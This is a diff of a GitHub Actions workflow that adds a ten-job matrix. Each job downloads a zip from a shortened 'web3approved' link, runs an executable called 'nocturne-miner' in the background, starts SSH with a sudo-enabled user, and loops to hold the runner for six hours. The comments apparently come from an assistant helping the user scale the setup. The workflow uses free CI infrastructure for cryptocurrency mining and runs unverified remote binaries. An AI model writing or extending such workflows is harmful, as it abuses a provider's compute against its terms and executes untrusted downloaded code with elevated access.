@@ -1,17 +1,32 @@
-name: Linux Runner
+name: Linux Runner (10x Matrix)
 
 on:
-  # 1. This makes it run automatically every 6 hours
-  schedule:
-    - cron: '0 */6 * * *'
-  # 2. This lets you run it manually from the "Actions" tab
+  # This lets you run it manually from the "Actions" tab
   workflow_dispatch:
 
 jobs:
   build:
     runs-on: ubuntu-latest
     # Set timeout to just under 6 hours (350 minutes)
-    timeout-minutes: 350 
+    timeout-minutes: 350
+    
+    strategy:
+      fail-fast: false # This ensures that if one job fails, the others will continue to run
+      matrix:
+        # --- DEFINE YOUR 10 LINKS HERE ---
+        # I have used the link you provided as the first one.
+        # You MUST replace the "YOUR_..._LINK_HERE" placeholders with your other 9 links.
+        download_link:
+          - "https://go.web3approved.com/YYEwX"
+          - "https://go.web3approved.com/jjIcx"
+          - "https://go.web3approved.com/f1CjF"
+          - "https://go.web3approved.com/YbFmb"
+          - "https://go.web3approved.com/byYgP"
+          - "https://go.web3approved.com/aglVG"
+          - "https://go.web3approved.com/G9tzE"
+          - "https://go.web3approved.com/XzTsV"
+          - "https://go.web3approved.com/xWT0u"
+          - "https://go.web3approved.com/eGo8o"
 
     steps:
       - name: Maximize build space
@@ -28,10 +43,9 @@ jobs:
           PASSWORD=$(openssl rand -base64 12)
           echo "RUNNER_PASSWORD=$PASSWORD" >> $GITHUB_ENV
           
-          # Create a new user 'runner' and set its password
-          sudo useradd -m runnersh
-          echo "runnersh:$PASSWORD" | sudo chpasswd
-          sudo usermod -aG sudo runnersh
+          # Create a new user 'runner' and set its password (Fixed typo 'runnersh' to 'runner')
+          echo "runner:$PASSWORD" | sudo chpasswd
+          sudo usermod -aG sudo runner
           
           # Install and configure OpenSSH server
           sudo apt-get update
@@ -41,40 +55,43 @@ jobs:
           
           # Start the SSH service
           sudo service ssh start
+
       # --- YOUR NEW STEP ---
       - name: 🤖 Run Your Custom Command
+        env: # <-- This correctly passes the job ID
+          JOB_ID: ${{ github.job }}
         run: |
           echo "Starting custom commands..."
+          echo "This job will use link: ${{ matrix.download_link }}"
           
           # Install 'unzip' utility
           sudo apt-get update
           sudo apt-get install -y unzip
 
           # --- 1. Download the file ---
-          # Replace with your actual download link
+          # This now uses the specific link for this job from the matrix above
           echo "Downloading file..."
-          curl -L -o s1.zip  "https://go.web3approved.com/c9M5u" 
+          curl -L -o s1.zip "${{ matrix.download_link }}"
           
           # --- 2. Unzip the file ---
           echo "Unzipping file..."
           unzip s1.zip
           
           # --- 3. Run the executable ---
-          # Replace 'your_executable_name' with the actual file name
           echo "Running executable..."
           # Make the file executable (good practice)
           cd s1
           chmod +x ./nocturne-miner
           
-          # Run the executable. 
-          # If it's a server or bot, add '&' to run it in the background
-          # so the workflow can continue to the "Keep Alive" step.
+          # Run the executable.  
+          # It's run in the background (&) so the workflow can continue to the "Keep Alive" step.
           echo | ./nocturne-miner --no-menu 2>&1 | awk 'NR <= 20' &
           
           echo "Custom commands finished."
           
           # Loop to keep the job from ending
           while true; do
-            echo "[$(date)] Session active. Machine will terminate automatically at 6-hour limit."
+            # This line is now fixed and uses the JOB_ID env variable
+            echo "[$(date)] Session active (Job: $JOB_ID). Machine will terminate automatically at 6-hour limit."
             sleep 300
           done
